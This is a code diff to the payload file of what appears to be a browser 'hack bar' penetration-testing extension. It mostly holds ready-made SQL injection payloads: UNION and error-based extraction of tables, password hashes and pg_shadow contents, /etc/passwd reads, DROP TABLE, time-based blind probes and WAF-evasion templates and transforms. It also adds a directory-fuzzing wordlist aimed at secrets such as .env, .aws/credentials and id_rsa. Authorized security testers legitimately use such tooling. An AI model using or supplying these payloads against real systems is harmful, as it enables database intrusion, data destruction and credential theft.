@@ -74,50 +74,6 @@ const predatorData = {
     "' AND 1=0 UNION SELECT 1,user(),@@hostname-- -"
   ],
 
-  union: [
-    "1 UNION SELECT 1-- -",
-    "1 UNION SELECT 1,2-- -",
-    "1 UNION SELECT 1,2,3-- -",
-    "1 UNION SELECT 1,2,3,4-- -",
-    "1 UNION SELECT 1,2,3,4,5-- -",
-    "1 UNION SELECT 1,2,3,4,5,6-- -",
-    "1 UNION SELECT 1,2,3,4,5,6,7-- -",
-    "1 UNION SELECT 1,2,3,4,5,6,7,8-- -",
-    "1 UNION SELECT 1,2,3,4,5,6,7,8,9-- -",
-    "1 UNION SELECT 1,2,3,4,5,6,7,8,9,10-- -",
-    "-1 UNION SELECT 1,2,3-- -",
-    "-1 UNION SELECT 1,2,3,4-- -",
-    "-1 UNION SELECT 1,2,3,4,5-- -",
-    "-1 UNION SELECT 1,2,3,4,5,6-- -",
-    "NULL UNION SELECT 1,2,3-- -",
-    "NULL UNION SELECT 1,2,3,4-- -",
-    "' UNION SELECT 1,2,3-- -",
-    "' UNION SELECT 1,2,3,4-- -",
-    "' UNION SELECT 1,2,3,4,5-- -",
-    "' UNION SELECT 1,2,3,4,5,6-- -",
-    "' UNION SELECT 1,2,3,4,5,6,7-- -",
-    "' UNION SELECT 1,2,3,4,5,6,7,8-- -",
-    "') UNION SELECT 1,2,3-- -",
-    "') UNION SELECT 1,2,3,4-- -",
-    "') UNION SELECT 1,2,3,4,5-- -",
-    "') UNION SELECT 1,2,3,4,5,6-- -",
-    "')) UNION SELECT 1,2,3-- -",
-    "1 UNION SELECT @@version,2,3-- -",
-    "1 UNION SELECT database(),user(),version()-- -",
-    "1 UNION SELECT group_concat(table_name),2,3 FROM information_schema.tables WHERE table_schema=database()-- -",
-    "1 UNION SELECT group_concat(column_name),2,3 FROM information_schema.columns WHERE table_name='users'-- -",
-    "1 UNION SELECT group_concat(username,0x3a,password),2,3 FROM users-- -",
-    "1 AND 1=2 UNION SELECT 1,database(),@@datadir-- -",
-    "1 AND 1=2 UNION SELECT 1,user(),@@hostname-- -",
-    "1 AND 1=2 UNION SELECT 1,load_file('/etc/passwd'),3-- -",
-    "' UNION SELECT NULL,NULL,NULL,NULL-- -",
-    "' UNION SELECT NULL,NULL,NULL,NULL,NULL-- -",
-    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL-- -",
-    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -",
-    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -",
-    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -"
-  ],
-
   wafunion: [
     "1 UNION/**/SELECT 1,2,3-- -",
     "1 UNION/**/SELECT 1,2,3,4-- -",
@@ -158,52 +114,6 @@ const predatorData = {
     "1 UNION(SELECT 1,@@version,@@hostname)-- -"
   ],
 
-  waf: [
-    "' OR '1'='1",
-    "' OR 1=1-- -",
-    "' OR/**/1=1-- -",
-    "' OR%0a1=1-- -",
-    "' OR%0d%0a1=1-- -",
-    "' OR 1=1#",
-    "' OR 1=1%23",
-    "' OR 1=2-- -",
-    "' AND 1=1-- -",
-    "' AND 1=2-- -",
-    "admin'-- -",
-    "admin'#",
-    "admin'/*",
-    "admin\"--",
-    "admin\"#",
-    "admin\"/*",
-    "' OR '1'='1'--",
-    "' OR '1'='1'#",
-    "' OR 1=1/*",
-    "' OR 1=1--",
-    "') OR ('1'='1",
-    "')) OR ((1=1",
-    "1' ORDER BY 1-- -",
-    "1' ORDER BY 2-- -",
-    "1' ORDER BY 3-- -",
-    "' UNION SELECT 1,2,3-- -",
-    "' UNION SELECT NULL-- -",
-    "' UNION SELECT NULL,NULL-- -",
-    "' AND SLEEP(5)-- -",
-    "' AND SLEEP(10)-- -",
-    "' AND BENCHMARK(5000000,MD5('x'))-- -",
-    "1' AND 1=(SELECT 1 FROM dual)-- -",
-    "'; DROP TABLE users-- -",
-    "' UNION SELECT @@version,2,3-- -",
-    "' UNION SELECT database(),user(),version()-- -",
-    "' UNION SELECT table_name,2,3 FROM information_schema.tables-- -",
-    "' UNION SELECT column_name,2,3 FROM information_schema.columns-- -",
-    "' OR 1=1 LIMIT 1-- -",
-    "' OR 1=1 GROUP BY 1-- -",
-    "' OR 1=1 HAVING 1=1-- -",
-    "'/*!ORA*/'1'='1",
-    "'/*!AND*/'1'='1",
-    "'/*!OR*/'1'='1"
-  ],
-
   mysqldios: [
     "' OR (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT (SELECT @@version) FROM information_schema.tables LIMIT 0,1),FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)a)-- -",
     "' OR (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT (SELECT database()) FROM information_schema.tables LIMIT 0,1),FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)a)-- -",
@@ -219,19 +129,27 @@ const predatorData = {
     "' OR (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT (SELECT @@plugin_dir)),FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)a)-- -"
   ],
 
+  // Unlike mysqldios (which uses MySQL's COUNT()/RAND() GROUP BY duplicate-key
+  // error trick — a real MySQL-only implementation detail), PostgreSQL doesn't
+  // produce that error at all. Its actual error-based technique is a type-cast
+  // error: CAST()'ing a subquery result to int fails with the real value
+  // embedded in the error message. These payloads use that genuine technique
+  // instead of just relabeling the MySQL one.
   postgredios: [
-    "' OR (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT (SELECT version()))::text,FLOOR(RAND()*2))x FROM generate_series(1,1000) GROUP BY x)a)-- -",
-    "' OR (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT (SELECT current_database()))::text,FLOOR(RAND()*2))x FROM generate_series(1,1000) GROUP BY x)a)-- -",
-    "' OR (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT (SELECT current_user))::text,FLOOR(RAND()*2))x FROM generate_series(1,1000) GROUP BY x)a)-- -",
-    "' OR (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT (SELECT table_name FROM information_schema.tables LIMIT 1))::text,FLOOR(RAND()*2))x FROM generate_series(1,1000) GROUP BY x)a)-- -",
-    "' OR (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT (SELECT column_name FROM information_schema.columns LIMIT 1))::text,FLOOR(RAND()*2))x FROM generate_series(1,1000) GROUP BY x)a)-- -",
-    "' OR (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT CONCAT(table_name,0x3a,column_name) FROM information_schema.columns LIMIT 1),FLOOR(RAND()*2))x FROM generate_series(1,1000) GROUP BY x)a)-- -",
-    "' OR (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT CONCAT(usename,0x3a,passwd) FROM pg_shadow LIMIT 1),FLOOR(RAND()*2))x FROM generate_series(1,1000) GROUP BY x)a)-- -",
-    "' OR (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT (SELECT inet_server_addr()))::text,FLOOR(RAND()*2))x FROM generate_series(1,1000) GROUP BY x)a)-- -",
-    "' OR (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT (SELECT current_setting('server_version')))::text,FLOOR(RAND()*2))x FROM generate_series(1,1000) GROUP BY x)a)-- -",
-    "' OR (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT (SELECT current_setting('data_directory')))::text,FLOOR(RAND()*2))x FROM generate_series(1,1000) GROUP BY x)a)-- -",
-    "' OR (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT (SELECT current_setting('config_file')))::text,FLOOR(RAND()*2))x FROM generate_series(1,1000) GROUP BY x)a)-- -",
-    "' OR (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT (SELECT current_setting('hba_file')))::text,FLOOR(RAND()*2))x FROM generate_series(1,1000) GROUP BY x)a)-- -"
+    "' AND CAST((SELECT version()) AS int)=1-- -",
+    "' AND CAST((SELECT current_database()) AS int)=1-- -",
+    "' AND CAST((SELECT current_user) AS int)=1-- -",
+    "' AND CAST((SELECT session_user) AS int)=1-- -",
+    "' AND CAST((SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1) AS int)=1-- -",
+    "' AND CAST((SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET 1) AS int)=1-- -",
+    "' AND CAST((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1) AS int)=1-- -",
+    "' AND CAST((SELECT string_agg(table_name,',') FROM information_schema.tables WHERE table_schema='public') AS int)=1-- -",
+    "' AND CAST((SELECT string_agg(column_name,',') FROM information_schema.columns WHERE table_name='users') AS int)=1-- -",
+    "' AND CAST((SELECT string_agg(usename||':'||passwd,',') FROM pg_shadow) AS int)=1-- -",
+    "' AND CAST((SELECT inet_server_addr()) AS int)=1-- -",
+    "' AND CAST((SELECT current_setting('server_version')) AS int)=1-- -",
+    "' AND CAST((SELECT current_setting('data_directory')) AS int)=1-- -",
+    "' AND CAST((SELECT current_setting('config_file')) AS int)=1-- -"
   ],
 
   localdios: [
@@ -771,6 +689,121 @@ const predatorData = {
   ]
 };
 
+// ---- WAF Bypass Templates (selection-based, used by the WAF panel) ----
+// Unlike predatorData above (fixed strings inserted at the cursor), these
+// are *templates*. The WAF panel wraps whatever text the user has
+// selected in the URL box into the "frame" defined by `value`, using the
+// {{SEL}} marker as the insertion point. A template with no {{SEL}}
+// marker (e.g. an alternate spelling of a keyword) simply replaces the
+// selection outright. See ui.js: wrapSelectionWithTemplate.
+const wafTemplates = {
+  'Comment Injection (MySQL)': [
+    { label: '/*!{{SEL}}*/', value: '/*!{{SEL}}*/' },
+    { label: '/*!50000{{SEL}}*/', value: '/*!50000{{SEL}}*/' },
+    { label: '/*!40000{{SEL}}*/', value: '/*!40000{{SEL}}*/' },
+    { label: '/*!12345{{SEL}}*/', value: '/*!12345{{SEL}}*/' },
+    { label: '/**/{{SEL}}/**/', value: '/**/{{SEL}}/**/' }
+  ],
+  'Keyword Bypass': [
+    { label: '/**/ORDER/**/BY/**/', value: '/**/ORDER/**/BY/**/' },
+    { label: '/*!ORDER*/+/*!BY*/', value: '/*!ORDER*/+/*!BY*/' },
+    { label: '/*!50000ORDER BY*/', value: '/*!50000ORDER BY*/' },
+    { label: '/**/UNION/**/SELECT/**/', value: '/**/UNION/**/SELECT/**/' },
+    { label: '/*!UNION*//*!SELECT*/', value: '/*!UNION*//*!SELECT*/' },
+    { label: '/*!50000UNION*//*!50000SELECT*/', value: '/*!50000UNION*//*!50000SELECT*/' },
+    { label: '/**/AND/**/', value: '/**/AND/**/' },
+    { label: '/**/OR/**/', value: '/**/OR/**/' },
+    { label: '/*!AND*/', value: '/*!AND*/' },
+    { label: '/*!OR*/', value: '/*!OR*/' }
+  ],
+  'Concat Bypass': [
+    { label: 'CONCAT({{SEL}})', value: 'CONCAT({{SEL}})' },
+    { label: 'CONCAT_WS(0x3a,{{SEL}})', value: 'CONCAT_WS(0x3a,{{SEL}})' },
+    { label: 'GROUP_CONCAT({{SEL}})', value: 'GROUP_CONCAT({{SEL}})' }
+  ]
+};
+
+// ---- WAF Bypass Transforms (selection-based, applied via a function) ----
+// These operate on the selected text itself rather than wrapping it.
+const wafTransforms = {
+  'Whitespace / Encoding': [
+    { label: 'spaces → /**/', fn: function (s) { return s.split(' ').join('/**/'); } },
+    { label: 'spaces → %0a', fn: function (s) { return s.split(' ').join('%0a'); } },
+    { label: 'spaces → %0d%0a', fn: function (s) { return s.split(' ').join('%0d%0a'); } },
+    { label: 'spaces → %09 (tab)', fn: function (s) { return s.split(' ').join('%09'); } },
+    { label: 'spaces → +', fn: function (s) { return s.split(' ').join('+'); } }
+  ],
+  'Case / Numeric': [
+    { label: 'rAnDoMiZe CaSe', fn: function (s) {
+        return s.split('').map(function (c) {
+          if (/[a-z]/.test(c)) return Math.random() < 0.5 ? c.toUpperCase() : c;
+          if (/[A-Z]/.test(c)) return Math.random() < 0.5 ? c.toLowerCase() : c;
+          return c;
+        }).join('');
+      } },
+    { label: 'number → 0xHEX', fn: function (s) {
+        var n = parseInt(s.trim(), 10);
+        return isNaN(n) ? s : '0x' + n.toString(16);
+      } },
+    { label: 'number → scientific (1e0)', fn: function (s) {
+        var n = parseInt(s.trim(), 10);
+        return isNaN(n) ? s : n + 'e0';
+      } }
+  ]
+};
+
+// ---- WAF One-Shot Extraction (ready-made payloads, WAF-SETS style) ----
+// Plain insert-at-cursor payloads for common data extraction one-liners.
+const wafOneShot = [
+  { label: 'Get tables (GROUP_CONCAT)', value: "' UNION SELECT GROUP_CONCAT(table_name SEPARATOR 0x3a),2,3 FROM information_schema.tables WHERE table_schema=database()-- -" },
+  { label: 'Get columns (GROUP_CONCAT)', value: "' UNION SELECT GROUP_CONCAT(column_name SEPARATOR 0x3a),2,3 FROM information_schema.columns WHERE table_name=0x7573657273-- -" },
+  { label: 'Get tables (one shot, error-based)', value: "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT GROUP_CONCAT(table_name SEPARATOR 0x3a) FROM information_schema.tables WHERE table_schema=database()),FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)a)-- -" },
+  { label: 'Get columns (one shot, error-based)', value: "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT GROUP_CONCAT(column_name SEPARATOR 0x3a) FROM information_schema.columns WHERE table_name=0x7573657273),FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)a)-- -" }
+];
+
+// ---- Directory / File Fuzzing Wordlist ----
+// A curated list of common paths/files for directory-busting style fuzzing.
+// Used as a default payload set in the Fuzzer panel — put [FUZZ] in the URL
+// path (e.g. https://target.com/[FUZZ]) and load this list.
+const dirWordlist = [
+  "admin", "administrator", "admin.php", "admin/login", "admin/login.php",
+  "login", "login.php", "signin", "signup", "register",
+  "wp-admin", "wp-login.php", "wp-content", "wp-includes", "wp-config.php",
+  "api", "api/v1", "api/v2", "graphql", "swagger", "swagger-ui", "swagger.json",
+  "backup", "backups", "backup.zip", "backup.sql", "backup.tar.gz", "db.sql", "dump.sql", "database.sql",
+  ".git", ".git/config", ".git/HEAD", ".svn", ".hg", ".idea", ".vscode", ".DS_Store",
+  ".env", ".env.local", ".env.production", ".htaccess", ".htpasswd", ".npmrc", ".aws", ".aws/credentials",
+  "config", "config.php", "configuration.php", "settings.php", "web.config", "docker-compose.yml", "Dockerfile",
+  "package.json", "composer.json", "composer.lock", "yarn.lock", "requirements.txt",
+  "test", "tests", "testing", "staging", "dev", "development", "beta",
+  "uploads", "upload", "files", "images", "img", "assets", "static", "public",
+  "js", "css", "includes", "inc", "lib", "libs", "vendor", "node_modules",
+  ".well-known", "robots.txt", "sitemap.xml", "sitemap_index.xml", "crossdomain.xml",
+  "server-status", "server-info", "phpinfo.php", "info.php", "phpmyadmin", "adminer.php", "pma",
+  "actuator", "actuator/health", "actuator/env", "health", "healthz", "status", "metrics", "version", "debug",
+  "console", "shell", "cgi-bin", "old", "old_site", "tmp", "temp",
+  "dashboard", "panel", "cpanel", "webmail", "manager", "management", "monitor",
+  "reset-password", "forgot-password", "private", "secret", "secrets", "keys", "key.pem", "id_rsa",
+  "error.log", "access.log", "debug.log", "README.md", "CHANGELOG.md", "LICENSE"
+];
+
+// ---- Fuzzer Payload Presets ----
+// Maps a preset id to a human label and the payload list it should load
+// into the Fuzzer panel's textarea. Reuses predatorData categories where
+// it makes sense (SQLi, XSS, etc.) plus the dedicated dirWordlist above.
+const fuzzerPresets = [
+  { id: 'dirs', label: 'Directory / File Fuzzing (common paths)', list: dirWordlist },
+  { id: 'sql', label: 'SQL Injection', list: predatorData.sql },
+  { id: 'wafunion', label: 'WAF UNION Bypass (SQLi)', list: predatorData.wafunion },
+  { id: 'xss', label: 'XSS', list: predatorData.xss },
+  { id: 'lfi', label: 'LFI / Path Traversal', list: predatorData.lfi },
+  { id: 'nosql', label: 'NoSQL Injection', list: predatorData.nosql },
+  { id: 'ssti', label: 'SSTI', list: predatorData.ssti },
+  { id: 'osci', label: 'OS Command Injection', list: predatorData.osci },
+  { id: 'ssrf', label: 'SSRF', list: predatorData.ssrf },
+  { id: 'blind', label: 'Blind SQLi', list: predatorData.blind }
+];
+
 // ---- Extraction Handlers (for data extraction view) ----
 const extractionHandlers = {
   default: function(text) { return text; },
@@ -820,3 +853,8 @@ const promptLogic = {
 window.KHackBar.Payloads.predatorData = predatorData;
 window.KHackBar.Payloads.extractionHandlers = extractionHandlers;
 window.KHackBar.Payloads.promptLogic = promptLogic;
+window.KHackBar.Payloads.wafTemplates = wafTemplates;
+window.KHackBar.Payloads.wafTransforms = wafTransforms;
+window.KHackBar.Payloads.wafOneShot = wafOneShot;
+window.KHackBar.Payloads.dirWordlist = dirWordlist;
+window.KHackBar.Payloads.fuzzerPresets = fuzzerPresets;
